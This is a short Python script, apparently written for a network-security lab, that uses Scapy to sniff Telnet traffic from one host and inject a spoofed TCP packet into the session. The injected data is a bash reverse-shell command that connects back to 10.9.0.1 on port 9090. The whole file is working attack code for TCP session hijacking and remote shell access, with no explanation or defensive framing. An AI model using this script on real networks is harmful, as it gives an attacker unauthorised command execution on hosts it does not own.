from scapy.all import *

def sniffAndHijack(pkt):
	old_seq = pkt[TCP].seq
	old_ack = pkt[TCP].ack
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=old_ack+5, ack=old_seq)
	# Crafting the payload: sending the command as if a user types it
	data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
	spoofedPkt = ip/tcp/data
	send(spoofedPkt,iface="br-c26fa13374f9",verbose=0)

# Sniffing on specified interface for TCP packets on port 23
sniff(iface='br-c26fa13374f9', filter='tcp and src host 10.9.0.5 and src port 23', prn=sniffAndHijack)

